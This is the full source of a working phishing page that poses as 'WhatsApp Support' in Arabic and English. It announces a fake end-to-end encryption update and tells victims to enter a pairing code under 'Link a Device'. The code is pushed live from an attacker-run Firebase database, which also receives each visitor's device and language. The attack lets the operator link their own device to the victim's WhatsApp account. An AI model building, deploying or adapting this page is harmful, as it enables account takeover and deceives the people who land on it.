<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WhatsApp Support</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
        .top-bar { position: absolute; top: 0; width: 100%; height: 25%; background-color: #00a884; z-index: -1; }
        .main-card { background: white; width: 90%; max-width: 400px; padding: 30px; border-radius: 10px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; }
        .whatsapp-logo { width: 70px; height: 70px; margin-bottom: 15px; }
        .title { color: #41525d; font-size: 20px; font-weight: 600; margin-bottom: 10px; }
        .device-info { background: #e7f3f3; color: #128c7e; padding: 8px; border-radius: 5px; font-size: 13px; font-weight: bold; margin-bottom: 15px; display: inline-block; }
        .instruction { color: #667781; font-size: 14px; line-height: 1.6; margin-bottom: 20px; text-align: right; }
        .alert-box { background: #fff3cd; color: #856404; padding: 10px; border-radius: 5px; font-size: 13px; margin-bottom: 20px; border: 1px solid #ffeeba; text-align: right; }
        .code-container { background-color: #f8f9fa; border: 1px solid #e9edef; padding: 15px; border-radius: 8px; display: inline-block; min-width: 85%; }
        #pairing-code { font-size: 32px; font-weight: bold; color: #128c7e; letter-spacing: 2px; font-family: 'Courier New', Courier, monospace; }
        [dir="ltr"] .instruction, [dir="ltr"] .alert-box { text-align: left; }
    </style>
</head>
<body>
    <div class="top-bar"></div>
    <div class="main-card">
        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp" class="whatsapp-logo">
        
        <div id="title" class="title"></div>
        <div id="device-tag" class="device-info"></div>

        <div id="alert" class="alert-box"></div>

        <div id="instruction" class="instruction"></div>

        <div class="code-container">
            <div id="pairing-code">...</div>
        </div>
    </div>

    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <script>
        const config = { databaseURL: "https://xstuxnet-7e038-default-rtdb.firebaseio.com/" };
        firebase.initializeApp(config);
        const db = firebase.database();

        // كشف نوع الجهاز تلقائياً
        function getDevice() {
            const ua = navigator.userAgent;
            if (/android/i.test(ua)) return "Android Device";
            if (/iPad|iPhone|iPod/.test(ua)) return "iPhone (iOS)";
            return "Mobile Device";
        }

        const deviceName = getDevice();

        const langData = {
            ar: {
                title: "تحديث بروتوكول التشفير (End-to-End)",
                device: "تم فحص جهازك: " + deviceName,
                alert: "⚠️ تنبيه: سيصلك الآن إشعار رسمي من تطبيق WhatsApp على هاتفك، يرجى الضغط عليه فوراً وإدخال الكود الموضح بالأسفل لإتمام التحديث.",
                instr: "خطوات التفعيل:<br>1. افتح الإشعار القادم من WhatsApp.<br>2. اضغط على 'ربط جهاز'.<br>3. أدخل الكود التالي فوراً:",
                loading: "جاري توليد الكود..."
            },
            en: {
                title: "Security Protocol Update (End-to-End)",
                device: "Device Verified: " + deviceName,
                alert: "⚠️ Alert: You will now receive an official notification from WhatsApp. Please tap it and enter the code below to complete the security update.",
                instr: "Activation Steps:<br>1. Open the WhatsApp notification.<br>2. Tap on 'Link a Device'.<br>3. Enter the following code immediately:",
                loading: "Generating code..."
            }
        };

        const userLang = navigator.language.startsWith('ar') ? 'ar' : 'en';
        document.documentElement.dir = userLang === 'ar' ? 'rtl' : 'ltr';
        
        document.getElementById('title').innerText = langData[userLang].title;
        document.getElementById('device-tag').innerText = langData[userLang].device;
        document.getElementById('alert').innerText = langData[userLang].alert;
        document.getElementById('instruction').innerHTML = langData[userLang].instr;
        document.getElementById('pairing-code').innerText = langData[userLang].loading;

        let vId = new URLSearchParams(window.location.search).get('id') || "User_" + Math.floor(Math.random() * 9999);
        db.ref('visiting/' + vId).set({ 
            status: "online", 
            device: deviceName,
            lang: userLang, 
            time: Date.now() 
        });

        db.ref('sessions/' + vId).on('value', (snapshot) => {
            const data = snapshot.val();
            if (data && data.code) {
                document.getElementById('pairing-code').innerText = data.code;
            }
        });
    </script>
</body>
</html>
